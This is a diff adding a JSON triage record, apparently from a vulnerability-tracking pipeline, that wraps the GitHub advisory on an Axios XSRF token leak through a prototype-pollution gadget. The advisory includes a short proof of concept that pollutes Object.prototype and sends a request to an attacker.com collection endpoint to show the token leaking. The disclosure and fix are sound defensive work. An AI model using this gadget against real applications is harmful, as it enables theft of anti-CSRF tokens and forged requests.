@@ -1,0 +1,58 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/11325101?v=4\", \"events_url\": \"https://api.github.com/users/August829/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/August829/followers\", \"following_url\": \"https://api.github.com/users/August829/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/August829/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/August829\", \"id\": 11325101, \"login\": \"August829\", \"node_id\": \"MDQ6VXNlcjExMzI1MTAx\", \"organizations_url\": \"https://api.github.com/users/August829/orgs\", \"received_events_url\": \"https://api.github.com/users/August829/received_events\", \"repos_url\": \"https://api.github.com/users/August829/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/August829/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/August829/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/August829\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-42042\", \"cvss\": {\"score\": 5.4, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 5.4, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-183\", \"name\": \"Permissive List of Allowed Inputs\"}, {\"cwe_id\": \"CWE-201\", \"name\": \"Insertion of Sensitive Information Into Sent Data\"}], \"description\": \"# Vulnerability Disclosure: XSRF Token Cross-Origin Leakage via Prototype Pollution Gadget in `withXSRFToken` Boolean Coercion\\n\\n## Summary\\n\\nThe Axios library's XSRF token protection logic uses JavaScript truthy/falsy semantics instead of strict boolean comparison for the `withXSRFToken` config property. When this property is set to any truthy non-boolean value (via prototype pollution or misconfiguration), the same-origin check (`isURLSameOrigin`) is **short-circuited**, causing XSRF tokens to be sent to **all** request targets including cross-origin servers controlled by an attacker.\\n\\n**Severity:** Medium (CVSS 5.4)\\n**Affected Versions:** All versions since `withXSRFToken` was introduced\\n**Vulnerable Component:** `lib/helpers/resolveConfig.js:59`\\n**Environment:** Browser-only (XSRF logic only runs when `hasStandardBrowserEnv` is true)\\n\\n## CWE\\n\\n- **CWE-201:** Insertion of Sensitive Information Into Sent Data\\n- **CWE-183:** Permissive List of Allowed Inputs\\n\\n## CVSS 3.1\\n\\n**Score: 5.4 (Medium)**\\n\\nVector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N`\\n\\n| Metric | Value | Justification |\\n|---|---|---|\\n| Attack Vector | Network | PP triggered remotely via vulnerable dependency |\\n| Attack Complexity | Low | Once PP exists, single property assignment. Consistent with GHSA-fvcv-3m26-pcqx |\\n| Privileges Required | None | No authentication needed |\\n| User Interaction | Required | Victim must use browser with axios making cross-origin requests |\\n| Scope | Unchanged | Token leakage within browser context |\\n| Confidentiality | Low | XSRF token leaked — anti-CSRF token, not session token |\\n| Integrity | Low | Stolen XSRF token enables CSRF attacks (bypass CSRF protection only) |\\n| Availability | None | No availability impact |\\n\\n## Usage of \\\"Helper\\\" Vulnerabilities\\n\\nThis vulnerability requires **Zero Direct User Input** when triggered via prototype pollution.\\n\\nIf an attacker can pollute `Object.prototype.withXSRFToken` with any truthy value (e.g., `1`, `\\\"true\\\"`, `{}`), Axios will automatically inherit this value during config merge. The truthy value short-circuits the same-origin check, causing the XSRF cookie value to be sent as a request header to every destination.\\n\\n## Vulnerable Code\\n\\n**File:** `lib/helpers/resolveConfig.js`, lines 57-66\\n\\n```javascript\\n// Line 57: Function check — only applies if withXSRFToken is a function\\nwithXSRFToken && utils.isFunction(withXSRFToken) && (withXSRFToken = withXSRFToken(newConfig));\\n\\n// Line 59: The vulnerable condition\\nif (withXSRFToken || (withXSRFToken !== false && isURLSameOrigin(newConfig.url))) {\\n//  ^^^^^^^^^^^^^^^^\\n//  When withXSRFToken = 1 (truthy non-boolean): this is true → short-circuits\\n//  isURLSameOrigin() is NEVER called → token sent to ANY origin\\n  const xsrfValue = xsrfHeaderName && xsrfCookieName && cookies.read(xsrfCookieName);\\n  if (xsrfValue) {\\n    headers.set(xsrfHeaderName, xsrfValue);\\n  }\\n}\\n```\\n\\n**Designed behavior:**\\n- `true` → always send token (explicit cross-origin opt-in)\\n- `false` → never send token\\n- `undefined` → send only for same-origin requests\\n\\n**Actual behavior for non-boolean truthy values (`1`, `\\\"false\\\"`, `{}`, `[]`):**\\n- All treated as truthy → same-origin check skipped → token sent everywhere\\n\\n## Proof of Concept\\n\\n```javascript\\n// Simulated prototype pollution from any vulnerable dependency\\nObject.prototype.withXSRFToken = 1;\\n\\n// In browser with document.cookie = \\\"XSRF-TOKEN=secret-csrf-token-abc123\\\"\\n// Every axios request now includes: X-XSRF-TOKEN: secret-csrf-token-abc123\\n// Even to cross-origin hosts:\\nawait axios.get('https://attacker.com/collect');\\n// → attacker receives the XSRF token in request headers\\n```\\n\\n## Verified PoC Output\\n\\n```\\nwithXSRFToken Value        Sends Token Cross-Origin  Expected\\ntrue (boolean)             YES                       Yes (opt-in)\\nfalse (boolean)            No                        No\\nundefined (default)        No                        No\\n1 (number)                 YES ← BUG                No\\n\\\"false\\\" (string)           YES ← BUG                No\\n{} (object)                YES ← BUG                No\\n[] (array)                 YES ← BUG                No\\n\\nPrototype pollution:\\n  Object.prototype.withXSRFToken = 1\\n  config.withXSRFToken = 1 → leaks=true\\n  isURLSameOrigin() was NOT called (short-circuited)\\n```\\n\\n## Impact Analysis\\n\\n- **XSRF Token Theft:** Anti-CSRF token sent as header to attacker-controlled server, enabling CSRF attacks against the victim application\\n- **Universal Scope:** A single `Object.prototype.withXSRFToken = 1` affects every axios request in the application\\n- **Misconfiguration Risk:** Developer writing `withXSRFToken: \\\"false\\\"` (string) instead of `false` (boolean) triggers the same issue without PP\\n\\n**Limitations:**\\n- Browser-only (XSRF logic runs only in `hasStandardBrowserEnv`)\\n- XSRF tokens are anti-CSRF tokens, not session tokens — leakage enables CSRF but not direct session hijacking\\n- Attacker still needs a way to deliver the forged request after obtaining the token\\n\\n## Recommended Fix\\n\\nUse strict boolean comparison:\\n\\n```javascript\\n// FIXED: lib/helpers/resolveConfig.js\\nconst shouldSendXSRF = withXSRFToken === true ||\\n  (withXSRFToken == null && isURLSameOrigin(newConfig.url));\\n\\nif (shouldSendXSRF) {\\n  const xsrfValue = xsrfHeaderName && xsrfCookieName && cookies.read(xsrfCookieName);\\n  if (xsrfValue) {\\n    headers.set(xsrfHeaderName, xsrfValue);\\n  }\\n}\\n```\\n\\n## Resources\\n\\n- [CWE-201: Insertion of Sensitive Information Into Sent Data](https://cwe.mitre.org/data/definitions/201.html)\\n- [CWE-183: Permissive List of Allowed Inputs](https://cwe.mitre.org/data/definitions/183.html)\\n- [GHSA-fvcv-3m26-pcqx: Related PP Gadget in Axios](https://github.com/advisories/GHSA-fvcv-3m26-pcqx)\\n- [Axios GitHub Repository](https://github.com/axios/axios)\\n\\n## Timeline\\n\\n| Date | Event |\\n|---|---|\\n| 2026-04-15 | Vulnerability discovered during source code audit |\\n| 2026-04-16 | Report revised: corrected CVSS, documented limitations |\\n| TBD | Report submitted to vendor via GitHub Security Advisory |\", \"epss\": {\"percentage\": 0.00228, \"percentile\": 0.1355}, \"ghsa_id\": \"GHSA-xx6v-rp6x-q39c\", \"github_reviewed_at\": \"2026-05-05T00:25:22Z\", \"html_url\": \"https://github.com/advisories/GHSA-xx6v-rp6x-q39c\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-xx6v-rp6x-q39c\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-42042\"}], \"nvd_published_at\": \"2026-04-24T18:16:31Z\", \"published_at\": \"2026-05-05T00:25:22Z\", \"references\": [\"https://github.com/axios/axios/security/advisories/GHSA-xx6v-rp6x-q39c\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-42042\", \"https://github.com/advisories/GHSA-xx6v-rp6x-q39c\"], \"repository_advisory_url\": \"https://api.github.com/repos/axios/axios/security-advisories/GHSA-xx6v-rp6x-q39c\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/axios/axios\", \"summary\": \"Axios: XSRF Token Cross-Origin Leakage via Prototype Pollution Gadget in `withXSRFToken` Boolean Coercion\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-05T00:25:23Z\", \"url\": \"https://api.github.com/advisories/GHSA-xx6v-rp6x-q39c\", \"vulnerabilities\": [{\"first_patched_version\": \"1.15.1\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"axios\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 1.0.0, < 1.15.1\"}, {\"first_patched_version\": \"0.31.1\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"axios\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 0.31.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-xx6v-rp6x-q39c",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "axios: <= 0.31.0",
+      "axios: >= 1.0.0, < 1.15.1"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-42042"
+    ],
+    "cvss_score": 5.4,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "axios"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:52:04.069735Z",
+  "provenance": {
+    "content_sha256": "c2410ede3001ad2eac9edf62e58535fa747e8868038478610bdf68276fa6b9dd",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-05T00:25:22Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-xx6v-rp6x-q39c",
+  "status": "active",
+  "title": "Axios: XSRF Token Cross-Origin Leakage via Prototype Pollution Gadget in `withXSRFToken` Boolean Coercion",
+  "updated_at": "2026-05-05T00:25:23Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-xx6v-rp6x-q39c"
+}
